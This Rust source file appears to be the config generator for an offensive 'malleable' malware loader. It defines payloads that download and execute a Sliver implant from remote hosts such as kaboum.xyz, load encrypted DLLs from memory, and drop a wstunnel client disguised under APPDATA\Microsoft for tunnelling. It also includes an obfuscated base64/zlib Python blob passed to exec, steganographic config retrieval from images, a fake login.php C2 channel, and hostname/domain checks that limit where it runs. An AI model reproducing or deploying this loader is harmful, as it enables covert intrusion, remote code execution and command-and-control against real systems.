extern crate argparse;

use malleable_rust_loader::config::Config;
use malleable_rust_loader::dataoperation::DataOperation;
//use malleable_rust_loader::defuse::CheckInternet;
use malleable_rust_loader::defuse::Defuse;
use malleable_rust_loader::defuse::DomainJoin;
use malleable_rust_loader::defuse::Hostname;
use malleable_rust_loader::defuse::Operator;
use malleable_rust_loader::create_config::initialize_all_configs;
use malleable_rust_loader::link::FileLink;
use malleable_rust_loader::link::HTTPLink;
use malleable_rust_loader::link::HTTPPostC2Link;
use malleable_rust_loader::link::Link;
use malleable_rust_loader::link::MemoryLink;
use malleable_rust_loader::payload::DllFromMemory;
use malleable_rust_loader::payload::Exec;
use malleable_rust_loader::payload::ExecPython;
use malleable_rust_loader::payload::Payload;
use malleable_rust_loader::payload::WriteFile;
use malleable_rust_loader::payload::WriteZip;
use malleable_rust_loader::poollink::Advanced;
use malleable_rust_loader::poollink::PoolLinks;
use malleable_rust_loader::poollink::PoolMode;

use ring::signature;
use ring::signature::Ed25519KeyPair;
use std::fs;

//use malleable_rust_loader::initialloader::initialize_loader;

use argparse::{ArgumentParser, Store, StoreTrue};
use log::error;
use log::info;
extern crate env_logger;

use std::collections::BTreeMap;

fn fromfile_master_keypair(path_file: &str) -> Ed25519KeyPair {
    let pkcs8_bytes: Vec<u8> = fs::read(path_file).unwrap();
    signature::Ed25519KeyPair::from_pkcs8(pkcs8_bytes.as_ref()).unwrap()
}

fn main() {
    env_logger::init();
    let mut link_timeout: u64 = 10;
    let mut link_user_agent: String ="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0".to_string();
    let mut verbose = false;
    let mut payload = "".to_string();
    let mut pool = "kaboum".to_string();
    let mut output: String = concat!(env!("HOME"), "/.malleable/config/initial.json").to_string();
    let mut keypair: String = concat!(env!("HOME"), "/.malleable/ed25519.u8").to_string();
    let mut loader_keypair: String = concat!(env!("HOME"), "/.malleable/config/ed25519.u8").to_string();
    let mut payload_dataope: String =
        concat!(env!("HOME"), "/.malleable/payload/sliver.dll.dataop").to_string();
    {
        let mut ap = ArgumentParser::new();
        ap.set_description("Generate configuration model for rust malleable loader. You can modify example generated by hand or modify this conf.rs file to fit your need. by Brother🔥");
        ap.refer(&mut payload)
            .add_argument("payload", Store, "choose a payload to generate the config, valid choice: banner, empty, writexeclin, dll, 2dll, dll2, py, file, memdll, wstunnel");
        ap.refer(&mut pool)
            .add_option(&["--pool"], Store, "choose a predefined PoolLinks (default: kaboum), choice: kaboumn, server");
        ap.refer(&mut verbose)
            .add_option(&["-v", "--verbose"], StoreTrue, "Be verbose");
        ap.refer(&mut output).add_option(
            &["--output"],
            Store,
            "config output path, default: /.malleable/config/initial.json",
        );
        ap.refer(&mut keypair).add_option(&["--keypair"], Store,"path of your private ed25519 key pair to sign configuration, default: ~/.malleable/ed25519.u8)");
        ap.refer(&mut loader_keypair).add_option(&["--keypair"], Store,"path of the loader private ed25519 key pair to send authenticated data with HTTPPostC2Link, default: ~/.malleable/config/ed25519.u8)");
        ap.refer(&mut payload_dataope).add_option(&["--payload-dataop"], Store,"path of the payload dataoperations (needed for AEAD because it require cryptmaterial), default: ~/.malleable/payload/sliver.dll.dataop");
        ap.refer(&mut link_timeout).add_option(&["--link-timeout"], Store,"global timeout for link");
        ap.refer(&mut link_user_agent).add_option(&["--link-user-agent"], Store,"global user-agent for link");
        ap.parse_args_or_exit();
    }
    let json_file = format!("{output}");
    info!("[+] You choose payload type: {}", payload);

    let payload_choice: Vec<Payload>;

    if payload == "banner".to_string() {
        info!("[+] Loader type choice: Banner");
        payload_choice = vec![Payload::Banner()];
    } else if payload == "empty".to_string() {
        info!("[+] Loader type choice: Empty");
        payload_choice = vec![];
    
    } else if payload == "writexeclin".to_string() {
        info!("[+] Loader type choice: WriteFile+Exec linux");
        payload_choice = vec![
            Payload::WriteFile(WriteFile {
                link: Link::HTTP(HTTPLink {
                    url: String::from("https://delivery.flameshot.space/nologin/sliv_linux"),
                    dataoperation: vec![],
                    jitt: 0,
                    sleep: 0,
                }),
                path: "/tmp/sliv_linux".to_string(),
                hash: "".to_string(),
            }),
            Payload::Exec(Exec {
                path: "/tmp/sliv_linux".to_string(),
                cmdline: "".to_string(),
                thread: true,
            }),
        ];
    } else if payload == "dll".to_string() {
        info!("[+] Loader type choice: DllFromMemory [AEAD]");
        let payload_dataoperation: Vec<DataOperation> =
            serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
        payload_choice = vec![Payload::DllFromMemory(DllFromMemory {
            link: Link::HTTP(HTTPLink {
                url: String::from("https://kaboum.xyz/artdonjon/donjon_dll.jpg"),
                dataoperation: payload_dataoperation,
                jitt: 0,
                sleep: 0,
            }),
            dll_entrypoint: String::from("DllInstall"),
            thread: true,
        })];
    } else if payload == "dll2".to_string() {
        info!("[+] Loader type choice: DllFromMemory [AEAD]");
        let payload_dataoperation: Vec<DataOperation> =
            serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
        payload_choice = vec![Payload::DllFromMemory(DllFromMemory {
            link: Link::HTTP(HTTPLink {
                url: String::from("https://kaboum.xyz/artdonjon/donjon_dll2.jpg"),
                dataoperation: payload_dataoperation,
                jitt: 0,
                sleep: 0,
            }),
            dll_entrypoint: String::from("DllInstall"),
            thread: true,
        })];
    } else if payload == "2dll".to_string() {
        info!("[+] Loader type choice: DllFromMemory [AEAD]");
        let payload_dataoperation: Vec<DataOperation> =
            serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
        payload_choice = vec![
            Payload::DllFromMemory(DllFromMemory {
            link: Link::HTTP(HTTPLink {
                url: String::from("https://kaboum.xyz/artdonjon/donjon_dll.jpg"),
                dataoperation: payload_dataoperation.clone(),
                jitt: 0,
                sleep: 0,
            }),
            dll_entrypoint: String::from("DllInstall"),
            thread: true,
            }),
            Payload::DllFromMemory(DllFromMemory {
                link: Link::HTTP(HTTPLink {
                    url: String::from("https://kaboum.xyz/artdonjon/donjon_dll2.jpg"),
                    dataoperation: payload_dataoperation,
                    jitt: 0,
                    sleep: 0,
                }),
                dll_entrypoint: String::from("DllInstall"),
                thread: true,
                }),
            ];
    } else if payload == "py".to_string() {
        info!("[+] Loader type choice: ExecPython");
        payload_choice = vec![
            Payload::WriteZip(WriteZip {
                link: Link::HTTP(HTTPLink {
                    url: String::from(
                        "https://www.python.org/ftp/python/3.10.10/python-3.10.10-embed-amd64.zip",
                    ),
                    dataoperation: vec![],
                    jitt: 0,
                    sleep: 0,
                }),
                path: "${APPDATA}\\Microsoft\\python\\python-3.10.10-embed-amd64\\".to_string(),
            }),
            Payload::ExecPython(ExecPython {
                path: "${APPDATA}\\Microsoft\\python\\python-3.10.10-embed-amd64\\".to_string(),
                python_code:String::from("
import base64
import zlib
encoded_script='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'
decoded_script = zlib.decompress(base64.b64decode(encoded_script.encode())).decode()
exec(decoded_script)
\0"),
                thread: false,
            }),
        ];
    } else if payload == "file".to_string() {
        info!("[+] Loader type choice: DllFromMemory [AEAD] from file");
        let payload_dataoperation: Vec<DataOperation> =
            serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
        payload_choice = vec![Payload::DllFromMemory(DllFromMemory {
            link: Link::FILE(FileLink {
                file_path: String::from("C:\\dll\\malldll.dll.aead"),
                dataoperation: payload_dataoperation,
                jitt: 0,
                sleep: 0,
            }),
            dll_entrypoint: String::from("DllInstall"),
            thread: true,
        })];
    } else if payload == "memdll".to_string() {
        info!("[+] Loader type choice: DllFromMemory [AEAD]");
        let payload_dataoperation: Vec<DataOperation> =
            serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
        payload_choice = vec![Payload::DllFromMemory(DllFromMemory {
            link: Link::MEMORY(MemoryLink {
                memory_nb: 4,
                dataoperation: payload_dataoperation,
                jitt: 0,
                sleep: 0,
            }),
            dll_entrypoint: String::from("DllInstall"),
            thread: false,
        })];
    } else if payload == "wstunnel".to_string() {
        // cp ~/wstunnel/target/x86_64-pc-windows-gnu/release/wstunnel.exe  ~/.malleable/payload/
        // cargo run --bin encrypt_payload ~/.malleable/payload/wstunnel.exe
        // cargo run --bin conf wstunnel --payload-dataop ~/.malleable/payload/wstunnel.exe.dataop
        // cp ~/.malleable/payload/wstunnel.exe.aead ../config/mem1
        // winrust loader --mem1 --mem2 --debug
        // root@sliver:~# ./wstunnel server --tls-certificate /etc/letsencrypt/live/sliverperso.kaboum.xyz/fullchain.pem --tls-private-key /etc/letsencrypt/live/sliverperso.kaboum.xyz/privkey.pem wss://[::]:8080

        info!("[+] Loader type choice: WriteFile Wstunnel from memory [AEAD]");
        let payload_dataoperation: Vec<DataOperation> =
            serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
        payload_choice = vec![
            Payload::WriteFile(WriteFile {
            link: Link::MEMORY(MemoryLink {
                memory_nb: 1,
                dataoperation: payload_dataoperation,
                jitt: 0,
                sleep: 0,
            }),
            path: String::from("${APPDATA}\\Microsoft\\wstunn3\\wstunnel.exe"),
            hash:"7fba14e73eab7f6595bc35e99c3fb0d5a04006bc20eee7a3389198bbd896cff42d006c3ecb952a78945da72f7d1d8942bd5314b00abe24fb38c3a9e03862b025".to_string(),
        }),
        Payload::Exec(Exec {
            path: String::from("${APPDATA}\\Microsoft\\wstunn3\\wstunnel.exe"),
            cmdline:String::from("client -L tcp://127.0.0.1:1080:127.0.0.1:10 --connection-min-idle 5 wss://sliverperso.kaboum.xyz:8080"),
            thread:true
        }),

        Payload::DllFromMemory(DllFromMemory {
            link: Link::MEMORY(MemoryLink {
                memory_nb: 2,
                dataoperation: vec![],
                jitt: 0,
                sleep: 0,
            }),
            dll_entrypoint: String::from("DllInstall"),
            thread: true,
        })

        ];
    } else {
        error!(
            r#"You must choose a payload, from:
- banner
- empty
- writexeclin
- dll
- dll2
- 2dll
- py
- file
- memdll
- wstunnel"#
        );
        panic!()
    }

    //let pool_links: BTreeMap<u64, (String, PoolLinks)> = BTreeMap::new();
    let pool_links: BTreeMap<u64, (String, PoolLinks)> ;
    if pool=="server".to_string() {
        info!("[+] PoolLinks: server");
        pool_links  = BTreeMap::from([(
            1,
            (
                "postC2".to_string(),
                PoolLinks {
                    pool_mode: PoolMode::ADVANCED(Advanced {
                        random: 0,          // fetch only x random link from pool and ignore the other, (0 not set)
                        max_link_broken: 0, // how many accepted link broken before switch to next pool if no conf found, (0 not set)
                        parallel: true, // try to fetch every link in the same time, if not its one by one
                        linear: true,   // fetch link in the order or randomized
                        stop_same: false, // stop if found the same conf -> not for parallel
                        stop_new: false, // stop if found a new conf -> not for parallel
                        accept_old: false, // accept conf older than the active one -> true not recommended, need to fight against hypothetic valid config replay.
                    }),
                    pool_links: vec![        
                    /* 
                    Link::HTTPPostC2(HTTPPostC2Link {
                            url: String::from("https://kaboum.xyz/admin/login.php"),
                            dataoperation: vec![DataOperation::WEBPAGE,DataOperation::BASE64],
                            dataoperation_post: vec![DataOperation::BASE64,DataOperation::BASE64],
                            jitt: 0,
                            sleep: 0,
                        }),*/
                        Link::HTTPPostC2(HTTPPostC2Link {
                            url: String::from("http://192.168.56.1:3000/login.php"),
                            //dataoperation: vec![DataOperation::BASE64],
                            dataoperation: vec![DataOperation::BASE64,DataOperation::BASE64],
                            dataoperation_post: vec![DataOperation::BASE64],
                            jitt: 0,
                            sleep: 0,
                        }),

                    ],
                },
            ),
        )]);
        
    } else  {
        info!("[+] PoolLinks: kaboum");

    pool_links = BTreeMap::from([
        (
            1,
            (
                "kaboum.xyz".to_string(),
                PoolLinks {
                    pool_mode: PoolMode::ADVANCED(Advanced {
                        random: 0,          // fetch only x random link from pool and ignore the other, (0 not set)
                        max_link_broken: 0, // how many accepted link broken before switch to next pool if no conf found, (0 not set)   
                        parallel: true, // try to fetch every link in the same time, if not its one by one
                        linear: true,   // fetch link in the order or randomized
                        stop_same: false, // stop if found the same conf -> not for parallel
                        stop_new: false, // stop if found a new conf -> not for parallel
                        accept_old: false, // accept conf older than the active one -> true not recommended, need to fight against hypothetic valid config replay.
                    }),
                    pool_links: vec![
                        Link::HTTP(HTTPLink {
                            url: String::from("https://kaboum.xyz/artdonjon/gobelin.html"),
                            dataoperation: vec![DataOperation::WEBPAGE,DataOperation::ROT13, DataOperation::BASE64, DataOperation::ZLIB ],
                            jitt: 0,
                            sleep: 0,
                        }),
                        Link::HTTP(HTTPLink {
                            url: String::from("https://kaboum.xyz/artdonjon/empty.png"),
                            dataoperation: vec![DataOperation::STEGANO],
                            jitt: 0,
                            sleep: 0,
                        }),
                        Link::HTTP(HTTPLink {
                            url: String::from("https://kaboum.xyz/artdonjon/troll.png"),
                            dataoperation: vec![DataOperation::STEGANO],
                            jitt: 0,
                            sleep: 0,
                        }),
                    ],
                },
            ),
        ),
        (
            2,
            (
                "backup 1".to_string(),
                PoolLinks {
                    pool_mode: PoolMode::SIMPLE,
                    pool_links: vec![Link::HTTP(HTTPLink {
                        url: String::from("https://kaboum.xyz/artdonjon/backup1.html"),
                        dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64, DataOperation::BASE64, DataOperation::ZLIB],
                        jitt: 0,
                        sleep: 0,
                    })],
                },
            ),
        ),
        (
            3,
            (
                "backup 2".to_string(),
                PoolLinks {
                    pool_mode: PoolMode::SIMPLE,
                    pool_links: vec![Link::HTTP(HTTPLink {
                        url: String::from("https://kaboum.xyz/artdonjon/backup2.html"),
                        dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64, DataOperation::BASE64, DataOperation::ZLIB],
                        jitt: 0,
                        sleep: 0,
                    })],
                },
            ),
        ),
    ]);
    };
    // 

    // payload is define, now, CREATE the
    info!("[+] LOAD ed25519 keypair from {:?}", keypair);
    let key_pair_ed25519: Ed25519KeyPair = fromfile_master_keypair(&keypair);

    let config = Config::new_signed(
        &key_pair_ed25519,
        pool_links,
        payload_choice,
        vec![ /* Defuse::CheckInternet(CheckInternet {
            list: vec![
                "https://www.microsoft.com".to_string(),
                "https://google.com".to_string(),
                "https://login.microsoftonline.com".to_string(),
            ],
            operator: Operator::AND,
        }) */
        ],
        vec![
            Defuse::Hostname(Hostname {
                list: vec!["DEBUG-W10".to_string(), "DRACONYS".to_string() ,"Nidhogg".to_string(),"DESKTOP-SU97K9D".to_string()],
                operator: Operator::OR,
            }),
            Defuse::DomainJoin(DomainJoin {
                list: vec!["sevenkingdoms.local".to_string(), "essos.local".to_string()],
                operator: Operator::AND,
            }),
        ],
        3,
        0,
        link_timeout,
        link_user_agent,
        fs::read(loader_keypair).unwrap()
    );
    //info!("{:?}", loaderconf);
    info!("[+] SIGN loader");

    info!("[+] Serialized loader configuration: {json_file}");
    config.serialize_to_file_pretty(&json_file);

    initialize_all_configs(config, json_file);
}
